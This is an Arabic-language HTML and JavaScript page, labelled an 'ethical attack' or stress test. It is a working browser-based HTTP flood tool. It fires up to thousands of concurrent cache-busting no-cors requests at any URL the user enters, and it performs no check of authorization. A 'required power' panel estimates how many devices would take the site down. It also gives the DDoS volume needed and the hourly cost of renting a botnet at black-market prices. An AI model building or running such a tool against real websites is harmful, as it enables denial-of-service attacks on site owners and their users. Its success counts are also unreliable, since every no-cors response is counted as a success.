<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>هجمة أخلاقية</title>
    <style>
        :root {
            --primary: #e74c3c;
            --secondary: #3498db;
            --success: #2ecc71;
            --warning: #f39c12;
            --danger: #c0392b;
            --light: #ecf0f1;
            --dark: #2c3e50;
            
            /* ألوان الوضع المظلم */
            --bg-dark: #121212;
            --card-dark: #1e1e1e;
            --text-dark: #e0e0e0;
            --border-dark: #333;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-dark);
            margin: 0;
            padding: 20px;
            color: var(--text-dark);
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: var(--card-dark);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        h1, h2, h3 {
            color: var(--primary);
        }
        
        h1 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 2.2rem;
            border-bottom: 2px solid var(--border-dark);
            padding-bottom: 15px;
        }
        
        .control-panel {
            background: #2a2a2a;
            padding: 25px;
            border-radius: 12px;
            margin-bottom: 30px;
            border: 1px solid var(--border-dark);
        }
        
        .form-row {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .form-group {
            flex: 1;
            min-width: 200px;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: var(--text-dark);
        }
        
        input, select, textarea {
            width: 100%;
            padding: 12px;
            background-color: #333;
            color: var(--text-dark);
            border: 1px solid var(--border-dark);
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 16px;
            transition: border 0.3s;
        }
        
        input:focus, select:focus, textarea:focus {
            border-color: var(--secondary);
            outline: none;
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
            background-color: #444;
        }
        
        .btn-group {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            margin-top: 25px;
        }
        
        button {
            padding: 14px 25px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-primary {
            background: var(--primary);
            color: white;
        }
        
        .btn-primary:hover {
            background: #c0392b;
            transform: translateY(-2px);
        }
        
        .btn-secondary {
            background: var(--secondary);
            color: white;
        }
        
        .btn-secondary:hover {
            background: #2980b9;
        }
        
        .btn-success {
            background: var(--success);
            color: white;
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
        }
        
        button:disabled {
            background: #555;
            color: #999;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        
        .stat-card {
            background: var(--card-dark);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
            text-align: center;
            border-top: 4px solid var(--primary);
        }
        
        .stat-card h3 {
            margin-top: 0;
            color: var(--text-dark);
            font-size: 1.1rem;
        }
        
        .stat-value {
            font-size: 2rem;
            font-weight: 700;
            margin: 10px 0;
            color: var(--text-dark);
        }
        
        .progress-container {
            margin-top: 30px;
        }
        
        .progress-info {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            color: var(--text-dark);
        }
        
        .progress-bar {
            height: 12px;
            background: #333;
            border-radius: 6px;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            width: 0%;
            transition: width 0.5s;
        }
        
        .server-health {
            margin-top: 30px;
            padding: 20px;
            border-radius: 10px;
            background: #2a2a2a;
            border-left: 5px solid var(--warning);
            color: var(--text-dark);
        }
        
        .server-health h2 {
            margin-top: 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .health-icon {
            font-size: 1.5rem;
        }
        
        .log-container {
            margin-top: 30px;
            border: 1px solid var(--border-dark);
            border-radius: 10px;
            overflow: hidden;
            background: var(--card-dark);
        }
        
        .log-header {
            background: var(--dark);
            color: white;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .log-controls button {
            padding: 5px 10px;
            font-size: 14px;
        }
        
        .log-content {
            max-height: 400px;
            overflow-y: auto;
            padding: 15px;
            background: #2a2a2a;
            font-family: 'Courier New', Courier, monospace;
            color: var(--text-dark);
        }
        
        .log-entry {
            padding: 8px 0;
            border-bottom: 1px solid var(--border-dark);
            display: flex;
            gap: 15px;
        }
        
        .log-time {
            color: #aaa;
            flex: 0 0 80px;
        }
        
        .log-message.success {
            color: var(--success);
        }
        
        .log-message.error {
            color: var(--danger);
        }
        
        .log-message.warning {
            color: var(--warning);
        }
        
        .log-message.info {
            color: var(--secondary);
        }
        
        .chart-container {
            margin-top: 30px;
            height: 300px;
            background: var(--card-dark);
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
        }
        
        /* قسم القوة المطلوبة الجديد */
        .required-power {
            margin-top: 30px;
            padding: 20px;
            border-radius: 10px;
            background: #2a2a2a;
            border-left: 5px solid var(--secondary);
            color: var(--text-dark);
        }
        
        .required-power h2 {
            margin-top: 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .power-icon {
            font-size: 1.5rem;
        }
        
        .power-calculations {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 15px;
        }
        
        .power-card {
            background: #333;
            padding: 15px;
            border-radius: 8px;
        }
        
        .power-card h4 {
            margin-top: 0;
            color: var(--secondary);
        }
        
        @media (max-width: 768px) {
            .form-row {
                flex-direction: column;
            }
            
            .stats-container, .power-calculations {
                grid-template-columns: 1fr;
            }
            
            .btn-group {
                flex-direction: column;
            }
            
            button {
                width: 100%;
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>هجوم أخلاقي | Little Programmer</h1>
        
        <div class="control-panel">
            <div class="form-row">
                <div class="form-group">
                    <label for="url">رابط الموقع:</label>
                    <input type="url" id="url" placeholder="https://example.com" required>
                </div>
                
                <div class="form-group">
                    <label for="method">نوع الهجوم:</label>
                    <select id="method">
                        <option value="GET">GET</option>
                        <option value="POST">POST</option>
                        <option value="PUT">PUT</option>
                        <option value="DELETE">DELETE</option>
                        <option value="HEAD">HEAD</option>
                    </select>
                </div>
            </div>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="concurrent">عدد الهجمات المتزامنة:</label>
                    <input type="number" id="concurrent" value="100" min="1" max="10000">
                </div>
                
                <div class="form-group">
                    <label for="delay">الفاصل الزمني (مللي ثانية):</label>
                    <input type="number" id="delay" value="500" min="50">
                </div>
                
                <div class="form-group">
                    <label for="duration">مدة الهجوم (ثانية):</label>
                    <input type="number" id="duration" value="300" min="1">
                </div>
            </div>
            
            <div class="form-group">
                <label for="headers">رؤوس HTTP إضافية (JSON):</label>
                <textarea id="headers" rows="3" placeholder='{"X-API-Key": "your-key", "Accept": "application/json"}'></textarea>
            </div>
            
            <div class="btn-group">
                <button id="startBtn" class="btn-primary">
                    <span>▶️</span> بدء الهجوم
                </button>
                <button id="stopBtn" class="btn-danger" disabled>
                    <span>⏹️</span> إيقاف
                </button>
                <button id="saveBtn" class="btn-secondary">
                    <span>💾</span> حفظ النتائج
                </button>
                <button id="clearBtn" class="btn-secondary">
                    <span>🧹</span> مسح السجل
                </button>
            </div>
        </div>
        
        <div class="progress-container">
            <div class="progress-info">
                <span>تقدم الاختبار</span>
                <span id="progressText">0%</span>
            </div>
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
        </div>
        
        <div class="stats-container">
            <div class="stat-card">
                <h3>الطلبات الناجحة</h3>
                <div class="stat-value" id="success">0</div>
                <div id="successRate">0%</div>
            </div>
            <div class="stat-card">
                <h3>الطلبات الفاشلة</h3>
                <div class="stat-value" id="failed">0</div>
                <div id="errorRate">0%</div>
            </div>
            <div class="stat-card">
                <h3>إجمالي الطلبات</h3>
                <div class="stat-value" id="total">0</div>
                <div id="requestsRate">0/ثانية</div>
            </div>
            <div class="stat-card">
                <h3>متوسط وقت الاستجابة</h3>
                <div class="stat-value" id="avgTime">0ms</div>
                <div id="maxTime">الأعلى: 0ms</div>
            </div>
        </div>
        
        <div class="server-health" id="serverHealth">
            <h2><span class="health-icon">🔍</span> تقييم قوة السيرفر</h2>
            <p id="healthText">سيظهر التقييم بعد بدء الاختبار...</p>
            <div id="serverSpecs"></div>
        </div>
        
        <!-- قسم القوة المطلوبة الجديد -->
        <div class="required-power" id="requiredPower">
            <h2><span class="power-icon">📊</span> تحليل القوة المطلوبة</h2>
            <p id="powerText">سيظهر التحليل بعد بدء الاختبار...</p>
            <div class="power-calculations" id="powerCalculations"></div>
        </div>
        
        <div class="chart-container">
            <canvas id="responseTimeChart"></canvas>
        </div>
        
        <div class="log-container">
            <div class="log-header">
                <h3>سجل الأحداث</h3>
                <div class="log-controls">
                    <button id="exportLogBtn" class="btn-secondary" style="padding: 5px 10px;">تصدير السجل</button>
                </div>
            </div>
            <div class="log-content" id="log"></div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script>
        // حالة الاختبار
        const state = {
            isTesting: false,
            successCount: 0,
            failedCount: 0,
            totalTime: 0,
            requestCount: 0,
            startTime: 0,
            testInterval: null,
            durationTimeout: null,
            workers: [],
            responseTimes: [],
            chart: null,
            concurrentRequests: 1,
            testDuration: 60
        };

        // عناصر الواجهة
        const elements = {
            url: document.getElementById('url'),
            method: document.getElementById('method'),
            delay: document.getElementById('delay'),
            duration: document.getElementById('duration'),
            concurrent: document.getElementById('concurrent'),
            headers: document.getElementById('headers'),
            startBtn: document.getElementById('startBtn'),
            stopBtn: document.getElementById('stopBtn'),
            saveBtn: document.getElementById('saveBtn'),
            clearBtn: document.getElementById('clearBtn'),
            exportLogBtn: document.getElementById('exportLogBtn'),
            success: document.getElementById('success'),
            failed: document.getElementById('failed'),
            total: document.getElementById('total'),
            avgTime: document.getElementById('avgTime'),
            maxTime: document.getElementById('maxTime'),
            successRate: document.getElementById('successRate'),
            errorRate: document.getElementById('errorRate'),
            requestsRate: document.getElementById('requestsRate'),
            progress: document.getElementById('progress'),
            progressText: document.getElementById('progressText'),
            log: document.getElementById('log'),
            healthText: document.getElementById('healthText'),
            serverSpecs: document.getElementById('serverSpecs'),
            serverHealth: document.getElementById('serverHealth'),
            chartCanvas: document.getElementById('responseTimeChart'),
            powerText: document.getElementById('powerText'),
            powerCalculations: document.getElementById('powerCalculations')
        };

        // الأحداث
        elements.startBtn.addEventListener('click', startTest);
        elements.stopBtn.addEventListener('click', stopTest);
        elements.saveBtn.addEventListener('click', saveResults);
        elements.clearBtn.addEventListener('click', clearLog);
        elements.exportLogBtn.addEventListener('click', exportLog);

        // بدء الاختبار
        function startTest() {
            const url = elements.url.value;
            const method = elements.method.value;
            const delay = parseInt(elements.delay.value);
            const duration = parseInt(elements.duration.value);
            const concurrent = parseInt(elements.concurrent.value);
            
            if (!url) {
                alert('الرجاء إدخال رابط الموقع!');
                return;
            }

            // إعادة تعيين الحالة
            resetState();
            state.isTesting = true;
            state.startTime = Date.now();
            state.concurrentRequests = concurrent;
            state.testDuration = duration;

            // تعطيل/تمكين الأزرار
            elements.startBtn.disabled = true;
            elements.stopBtn.disabled = false;

            // تسجيل بداية الاختبار
            logMessage(`🚀 بدء اختبار الضغط على ${url}`, 'info');
            logMessage(`⚡ ${method} طلبات متزامنة: ${concurrent} - الفاصل: ${delay}ms`, 'info');
            logMessage(`⏱️ مدة الاختبار: ${duration} ثانية`, 'info');

            // بدء الرسوم البيانية
            initChart();

            // بدء الطلبات المتزامنة
            for (let i = 0; i < concurrent; i++) {
                state.workers.push(setInterval(() => sendRequest(i), delay));
            }

            // إيقاف تلقائي إذا كانت المدة محددة
            if (duration > 0) {
                state.durationTimeout = setTimeout(() => {
                    stopTest();
                    logMessage('⏰ انتهت مدة الاختبار المحددة', 'info');
                }, duration * 1000);
            }

            // تحديث شريط التقدم
            updateProgress();
        }

        // إرسال طلب واحد (النسخة المعدلة)
        function sendRequest(workerId) {
            if (!state.isTesting) return;

            const url = elements.url.value;
            const method = elements.method.value;
            const startTime = performance.now();
            const cacheBuster = `?stress_test=${Date.now()}_${workerId}`;
            
            // تحليل الرؤوس الإضافية
            let headers = {
                'Cache-Control': 'no-cache'
            };
            
            try {
                const customHeaders = JSON.parse(elements.headers.value || '{}');
                headers = {...headers, ...customHeaders};
            } catch (e) {
                logMessage(`❌ خطأ في تحليل الرؤوس: ${e.message}`, 'error');
            }

            // إرسال الطلب مع no-cors
            fetch(url + cacheBuster, {
                method: method,
                mode: 'no-cors',  // أهم تعديل
                cache: 'no-cache',
                headers: headers
            })
            .then(() => {  // لا نتحقق من response.status الآن
                const endTime = performance.now();
                const duration = endTime - startTime;
                
                updateStats({
                    success: true,  // دائما نجاح ما دامت هناك استجابة
                    duration: duration,
                    status: 200,    // افتراضي
                    workerId: workerId
                });
                
                logMessage(
                    `✅ [Worker ${workerId}] طلب #${state.requestCount}: تمت الاستجابة - ${duration.toFixed(2)}ms`,
                    'success'
                );
            })
            .catch(error => {
                updateStats({
                    success: false,
                    error: error.message,
                    workerId: workerId
                });
                
                logMessage(
                    `❌ [Worker ${workerId}] طلب #${state.requestCount}: فشل - ${error.message}`,
                    'error'
                );
            });
        }

        // تحديث الإحصائيات
        function updateStats({success, duration, status, error, workerId}) {
            state.requestCount++;
            
            if (success) {
                state.successCount++;
                state.totalTime += duration;
                state.responseTimes.push(duration);
                updateChart(duration);
            } else {
                state.failedCount++;
            }
            
            // تحديث الواجهة
            elements.success.textContent = state.successCount;
            elements.failed.textContent = state.failedCount;
            elements.total.textContent = state.requestCount;
            
            // حساب المعدلات
            const successRate = (state.successCount / state.requestCount * 100).toFixed(1);
            const errorRate = (state.failedCount / state.requestCount * 100).toFixed(1);
            
            elements.successRate.textContent = `${successRate}%`;
            elements.errorRate.textContent = `${errorRate}%`;
            
            // أوقات الاستجابة
            if (success) {
                const avgTime = (state.totalTime / state.successCount).toFixed(2);
                elements.avgTime.textContent = `${avgTime}ms`;
                
                const maxTime = Math.max(...state.responseTimes).toFixed(2);
                elements.maxTime.textContent = `الأعلى: ${maxTime}ms`;
            }
            
            // معدل الطلبات
            const elapsed = (Date.now() - state.startTime) / 1000;
            const requestsPerSec = (state.requestCount / elapsed).toFixed(2);
            elements.requestsRate.textContent = `${requestsPerSec}/ثانية`;
            
            // تقييم السيرفر
            evaluateServerHealth();
            
            // تحليل القوة المطلوبة
            analyzeRequiredPower(requestsPerSec);
        }

        // تحليل القوة المطلوبة لإسقاط الموقع
        function analyzeRequiredPower(requestsPerSec) {
            if (state.requestCount < 10) return; // لا تحلل مع بيانات قليلة
            
            // افتراض أن الموقع يسقط عند 5 أضعاف معدل الطلبات الحالي
            const crashThreshold = requestsPerSec * 5;
            
            // افتراض أن كل جهاز يمكنه إرسال 50 طلب/ثانية (يعتمد على اتصال الإنترنت)
            const requestsPerDevice = 50;
            
            // عدد الأجهزة المطلوبة لتجاوز عتبة السقوط
            const devicesNeeded = Math.ceil(crashThreshold / requestsPerDevice);
            
            // تقدير حجم هجوم DDoS المطلوب
            const ddosSize = (devicesNeeded * requestsPerDevice).toLocaleString();
            
            // تقدير تكلفة هجوم DDoS (افتراض $0.5 لكل جهاز في الساعة)
            const ddosCost = (devicesNeeded * 0.5).toLocaleString();
            
            // تحديث واجهة المستخدم
            elements.powerText.innerHTML = `
                <strong>معدل الطلبات الحالي:</strong> ${requestsPerSec}/ثانية<br>
                <strong>عتبة السقوط المقدرة:</strong> ~${crashThreshold.toLocaleString()}/ثانية
            `;
            
            elements.powerCalculations.innerHTML = `
                <div class="power-card">
                    <h4>عدد الأجهزة المطلوبة</h4>
                    <p>لإسقاط هذا الموقع، قد تحتاج إلى <strong>${devicesNeeded}</strong> جهاز يعملون في نفس الوقت.</p>
                    <p>كل جهاز قادر على إرسال ~${requestsPerDevice} طلب/ثانية.</p>
                </div>
                <div class="power-card">
                    <h4>حجم هجوم DDoS</h4>
                    <p>هجوم DDoS فعال يحتاج إلى <strong>${ddosSize}</strong> طلب/ثانية.</p>
                    <p>هذا يعادل ~${Math.ceil(devicesNeeded/1000)}k جهاز.</p>
                </div>
                <div class="power-card">
                    <h4>التكلفة المقدرة</h4>
                    <p>تكلفة استئجار شبكة بوت نت لهذا الهجوم: <strong>~${ddosCost}$/ساعة</strong>.</p>
                    <p>هذا تقدير يعتمد على أسعار السوق السوداء.</p>
                </div>
                <div class="power-card">
                    <h4>نقاط الضعف</h4>
                    <p>لحماية الموقع، يجب أن يدعم <strong>${Math.ceil(crashThreshold*1.2).toLocaleString()}</strong> طلب/ثانية.</p>
                    <p>استخدم CDN وموازن حمل لتحسين الأداء.</p>
                </div>
            `;
        }

        // إيقاف الاختبار
        function stopTest() {
            if (!state.isTesting) return;
            
            state.isTesting = false;
            
            // إيقاف جميع العمال
            state.workers.forEach(worker => clearInterval(worker));
            state.workers = [];
            
            // إيقاف المؤقتات
            clearTimeout(state.durationTimeout);
            
            // تحديث الواجهة
            elements.startBtn.disabled = false;
            elements.stopBtn.disabled = true;
            
            const totalTime = (Date.now() - state.startTime) / 1000;
            logMessage(`🛑 تم إيقاف الاختبار بعد ${totalTime.toFixed(2)} ثانية`, 'info');
            
            // التقييم النهائي للسيرفر
            evaluateServerHealth(true);
            
            // التقييم النهائي للقوة المطلوبة
            const requestsPerSec = (state.requestCount / totalTime).toFixed(2);
            analyzeRequiredPower(requestsPerSec);
        }

        // تقييم صحة السيرفر
        function evaluateServerHealth(final = false) {
            if (state.requestCount === 0) return;
            
            const avgResponseTime = state.successCount > 0 ? state.totalTime / state.successCount : 0;
            const errorRate = (state.failedCount / state.requestCount) * 100;
            const requestsPerSec = state.requestCount / ((Date.now() - state.startTime) / 1000);
            
            let healthStatus = '';
            let healthIcon = '🔍';
            let healthClass = 'info';
            let specs = '';
            
            if (errorRate > 30 || avgResponseTime > 5000) {
                healthStatus = 'ضعيف جدًا';
                healthIcon = '💥';
                healthClass = 'error';
                specs = `
                    <ul>
                        <li>يحتمل أن يكون سيرفر بمواصفات محدودة (1 Core، 1GB RAM)</li>
                        <li>لا يوجد موازن حمل أو CDN</li>
                        <li>توقف عن الاستجابة تحت ضغط منخفض</li>
                    </ul>
                `;
            } else if (errorRate > 10 || avgResponseTime > 2000) {
                healthStatus = 'متوسط';
                healthIcon = '⚠️';
                healthClass = 'warning';
                specs = `
                    <ul>
                        <li>يحتمل أن يكون سيرفر متوسط المواصفات (2-4 Cores، 4-8GB RAM)</li>
                        <li>قد يحتاج إلى تحسينات في التكوين</li>
                        <li>أظهر تباطؤًا تحت الضغط</li>
                    </ul>
                `;
            } else {
                healthStatus = 'قوي';
                healthIcon = '✅';
                healthClass = 'success';
                specs = `
                    <ul>
                        <li>يحتمل أن يكون سيرفر قوي المواصفات (8+ Cores، 16+GB RAM)</li>
                        <li>يستخدم موازن حمل و/أو CDN</li>
                        <li>تحمل الضغط بكفاءة عالية</li>
                    </ul>
                `;
            }
            
            elements.healthText.innerHTML = `
                <strong>الحالة:</strong> ${healthIcon} ${healthStatus}<br>
                <strong>متوسط الاستجابة:</strong> ${avgResponseTime.toFixed(2)}ms<br>
                <strong>معدل الخطأ:</strong> ${errorRate.toFixed(2)}%<br>
                <strong>معدل الطلبات:</strong> ${requestsPerSec.toFixed(2)}/ثانية
            `;
            
            if (final) {
                elements.serverSpecs.innerHTML = specs;
            }
            
            // تحديث لون بطاقة الصحة
            elements.serverHealth.style.borderLeftColor = `var(--${healthClass})`;
            elements.serverHealth.querySelector('.health-icon').textContent = healthIcon;
        }

        // تسجيل الرسائل
        function logMessage(message, type = 'info') {
            const logEntry = document.createElement('div');
            logEntry.className = 'log-entry';
            
            const time = document.createElement('span');
            time.className = 'log-time';
            time.textContent = new Date().toLocaleTimeString();
            
            const msg = document.createElement('span');
            msg.className = `log-message ${type}`;
            msg.textContent = message;
            
            logEntry.appendChild(time);
            logEntry.appendChild(msg);
            elements.log.appendChild(logEntry);
            elements.log.scrollTop = elements.log.scrollHeight;
        }

        // تحديث شريط التقدم
        function updateProgress() {
            if (!state.isTesting) return;
            
            const elapsed = (Date.now() - state.startTime) / 1000;
            const progress = (elapsed / state.testDuration) * 100;
            
            if (progress <= 100) {
                elements.progress.style.width = `${progress}%`;
                elements.progressText.textContent = `${Math.min(Math.round(progress), 100)}%`;
                setTimeout(updateProgress, 100);
            }
        }

        // إعادة تعيين الحالة
        function resetState() {
            state.isTesting = false;
            state.successCount = 0;
            state.failedCount = 0;
            state.totalTime = 0;
            state.requestCount = 0;
            state.startTime = 0;
            state.responseTimes = [];
            
            clearInterval(state.testInterval);
            clearTimeout(state.durationTimeout);
            state.workers.forEach(worker => clearInterval(worker));
            state.workers = [];
            
            elements.success.textContent = '0';
            elements.failed.textContent = '0';
            elements.total.textContent = '0';
            elements.avgTime.textContent = '0ms';
            elements.maxTime.textContent = 'الأعلى: 0ms';
            elements.successRate.textContent = '0%';
            elements.errorRate.textContent = '0%';
            elements.requestsRate.textContent = '0/ثانية';
            elements.progress.style.width = '0%';
            elements.progressText.textContent = '0%';
            
            elements.healthText.textContent = 'سيظهر التقييم بعد بدء الاختبار...';
            elements.serverSpecs.innerHTML = '';
            elements.serverHealth.style.borderLeftColor = 'var(--warning)';
            
            elements.powerText.textContent = 'سيظهر التحليل بعد بدء الاختبار...';
            elements.powerCalculations.innerHTML = '';
        }

        // تهيئة الرسم البياني
        function initChart() {
            if (state.chart) {
                state.chart.destroy();
            }
            
            const ctx = elements.chartCanvas.getContext('2d');
            state.chart = new Chart(ctx, {
                type: 'line',
                data: {
                    labels: [],
                    datasets: [{
                        label: 'وقت الاستجابة (ms)',
                        data: [],
                        borderColor: 'rgba(231, 76, 60, 1)',
                        backgroundColor: 'rgba(231, 76, 60, 0.1)',
                        borderWidth: 2,
                        tension: 0.1,
                        fill: true
                    }]
                },
                options: {
                    responsive: true,
                    scales: {
                        y: {
                            beginAtZero: true,
                            title: {
                                display: true,
                                text: 'الوقت (ms)'
                            },
                            grid: {
                                color: 'rgba(255, 255, 255, 0.1)'
                            },
                            ticks: {
                                color: 'rgba(255, 255, 255, 0.7)'
                            }
                        },
                        x: {
                            title: {
                                display: true,
                                text: 'رقم الطلب',
                                color: 'rgba(255, 255, 255, 0.7)'
                            },
                            grid: {
                                color: 'rgba(255, 255, 255, 0.1)'
                            },
                            ticks: {
                                color: 'rgba(255, 255, 255, 0.7)'
                            }
                        }
                    },
                    plugins: {
                        legend: {
                            labels: {
                                color: 'rgba(255, 255, 255, 0.7)'
                            }
                        },
                        tooltip: {
                            backgroundColor: 'rgba(0, 0, 0, 0.8)',
                            titleColor: 'rgba(255, 255, 255, 0.9)',
                            bodyColor: 'rgba(255, 255, 255, 0.9)',
                            borderColor: 'rgba(255, 255, 255, 0.2)',
                            borderWidth: 1
                        }
                    }
                }
            });
        }

        // تحديث الرسم البياني
        function updateChart(responseTime) {
            if (!state.chart) return;

            const chart = state.chart;
            chart.data.labels.push(state.requestCount);
            chart.data.datasets[0].data.push(responseTime);

            if (chart.data.labels.length > 50) {
                chart.data.labels.shift();
                chart.data.datasets[0].data.shift();
            }

            chart.update();
        }

        // حفظ النتائج
        function saveResults() {
            const results = {
                successCount: state.successCount,
                failedCount: state.failedCount,
                totalRequests: state.requestCount,
                avgResponseTime: (state.totalTime / state.successCount).toFixed(2),
                maxResponseTime: Math.max(...state.responseTimes).toFixed(2),
                startTime: new Date(state.startTime).toLocaleString(),
                endTime: new Date().toLocaleString()
            };

            const blob = new Blob([JSON.stringify(results, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'stress_test_results.json';
            a.click();
            URL.revokeObjectURL(url);

            logMessage('💾 تم حفظ النتائج بنجاح!', 'success');
        }

        // تصدير السجل
        function exportLog() {
            const logEntries = Array.from(elements.log.children).map(entry => {
                const time = entry.querySelector('.log-time').textContent;
                const message = entry.querySelector('.log-message').textContent;
                return `[${time}] ${message}`;
            });

            const blob = new Blob([logEntries.join('\n')], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'stress_test_log.txt';
            a.click();
            URL.revokeObjectURL(url);

            logMessage('📄 تم تصدير السجل بنجاح!', 'success');
        }

        // مسح السجل
        function clearLog() {
            elements.log.innerHTML = '';
            logMessage('🧹 تم مسح السجل.', 'info');
        }
    </script>
</body>
</html>